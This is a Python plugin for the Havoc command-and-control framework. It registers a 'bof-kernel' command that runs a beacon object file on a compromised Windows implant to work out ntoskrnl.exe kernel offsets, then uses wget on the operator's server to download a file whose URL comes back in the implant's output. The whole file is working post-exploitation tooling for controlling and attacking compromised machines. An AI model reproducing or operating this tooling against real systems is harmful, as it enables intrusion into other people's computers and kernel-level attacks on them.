from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists
from struct import pack, calcsize
import os
import requests
import subprocess

class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size: int = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4

def my_callback(demonID, TaskID, worked, output, error):
    demon = Demon(demonID)
    demon.ConsoleWrite(demon.CONSOLE_INFO, f"bof status: {worked}")

    if worked:
        print(output)
        output = output.split("$$")
        demon.ConsoleWrite(demon.CONSOLE_INFO, f"bof output:\n")
        for line in output:
            demon.ConsoleWrite(demon.CONSOLE_INFO, f" {line}")
            if "Download path:" in line:
                url = line.split(": ")[1]
                print(url)
                demon.ConsoleWrite(demon.CONSOLE_INFO, f"Downloading {url} to server. This will take a few minutes")
                path= "/tmp/"+url.split('/')[-1].strip()
                #os.system(f"wget {url} -O {path}") #fix me
                subprocess.run(["wget", url.strip(), "-O", path], check=True)
                demon.ConsoleWrite(demon.CONSOLE_INFO, f"File saved to {path}\n")

def bof(demon_id, *args):

    task_id = None
    demon = None
    packer = Packer()
    string = None
    bof = None
    int32 = 0

    demon = Demon(demon_id)

    if len(args) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    bof = args[0]
    if not exists(bof):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Bof not found at "+bof)
        return False

    string = args[1]

    packer.addstr(string)

    return demon.InlineExecuteGetOutput(my_callback, "go", bof, packer.getbuffer())

RegisterCommand(bof, "", "bof-kernel", "Dynamic kernel offset generator", 0, "[string] [string]", "/path/to/bof.o C:\\Windows\\System32\\ntoskrnl.exe")
